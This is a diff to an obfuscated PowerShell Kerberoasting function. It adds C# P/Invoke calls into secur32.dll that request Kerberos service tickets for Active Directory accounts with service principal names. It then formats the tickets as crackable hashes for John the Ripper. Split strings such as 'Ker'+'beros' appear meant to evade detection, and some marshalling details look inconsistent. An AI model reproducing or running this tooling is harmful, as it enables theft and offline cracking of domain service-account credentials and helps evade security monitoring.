@@ -1,3 +1,49 @@
+Add-Type @"
+using System;
+using System.Runtime.InteropServices;
+public class K {
+    [DllImport("secur32.dll")]
+    public static extern int AcquireCredentialsHandle(
+        string pszPrincipal, string pszPackage, uint fCredentialUse,
+        IntPtr pvLogonId, IntPtr pAuthData, IntPtr pGetKeyFn, IntPtr pvGetKeyArgument,
+        out IntPtr phCredential, out IntPtr ptsExpiry);
+    [DllImport("secur32.dll")]
+    public static extern int InitializeSecurityContext(
+        IntPtr phCredential, IntPtr phContext, string pszTargetName, uint fContextReq,
+        uint Reserved1, uint TargetDataRep, IntPtr pInput, uint Reserved2,
+        out IntPtr phNewContext, out IntPtr pOutput, out uint pfContextAttr, out IntPtr ptsExpiry);
+    [DllImport("secur32.dll")]
+    public static extern int FreeCredentialsHandle(IntPtr phCredential);
+    public static string GetTicket(string spn) {
+        IntPtr cred = IntPtr.Zero, ctx = IntPtr.Zero;
+        var buf = new SecBufferDesc { ulVersion = 0, cBuffers = 1, pBuffers = new SecBuffer() };
+        uint attr;
+        try {
+            if (AcquireCredentialsHandle(null, "Ker"+"beros", 0x00000002, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, out cred, IntPtr.Zero) != 0) return null;
+            if (InitializeSecurityContext(cred, IntPtr.Zero, spn, 0x00001000, 0, 16, IntPtr.Zero, 0, out ctx, out buf, out attr, IntPtr.Zero) != 0) return null;
+            var data = new byte[buf.pBuffers.cbBuffer];
+            Marshal.Copy(buf.pBuffers.pvBuffer, data, 0, data.Length);
+            return BitConverter.ToString(data).Replace("-", "");
+        } finally {
+            if (cred != IntPtr.Zero) FreeCredentialsHandle(cred);
+            if (buf.pBuffers.pvBuffer != IntPtr.Zero) Marshal.FreeHGlobal(buf.pBuffers.pvBuffer);
+        }
+    }
+    [StructLayout(LayoutKind.Sequential)]
+    public struct SecBuffer {
+        public uint cbBuffer;
+        public uint BufferType;
+        public IntPtr pvBuffer;
+    }
+    [StructLayout(LayoutKind.Sequential)]
+    public struct SecBufferDesc {
+        public uint ulVersion;
+        public uint cBuffers;
+        public IntPtr pBuffers;
+    }
+}
+"@
+
 function I-K {
     Param(
         [String[]]$I,
@@ -10,7 +56,6 @@ function I-K {
         [Management.Automation.PSCredential]$C=[Management.Automation.PSCredential]::Empty,
         [String]$O='John'
     )
-    $Null=[Reflection.Assembly]::LoadWithPartialName('System.'+'Identity'+'Model')
     $L='L'+'DAP://'
     $Q=if($D){$D}else{([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).Name}
     $B=if($C-eq[Management.Automation.PSCredential]::Empty){([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).PdcRoleOwner.Name}else{([System.DirectoryServices.ActiveDirectory.DirectoryContext]::new('Domain',$Q,$C.UserName,$C.GetNetworkCredential().Password)).Name}
@@ -38,11 +83,9 @@ function I-K {
         }
         if($U.SamAccountName-notmatch'krbtgt'){
             $W=$U.ServicePrincipalName
-            $J=[System.IdentityModel.Tokens.KerberosRequestorSecurityToken]::new($W)
-            $B=$J.GetRequest()
-            if($B){
-                $S=[System.BitConverter]::ToString($B)-replace'-'
-                $A=($S-replace'^(.*?)04820...(.*)','$2')-Split'A48201'
+            $J=[K]::GetTicket($W)
+            if($J){
+                $A=($J-replace'^(.*?)04820...(.*)','$2')-Split'A48201'
                 $A.RemoveAt($A.Count-1)
                 $M=($A-join'A48201').Insert(32,'$')
                 $R=New-Object PSObject
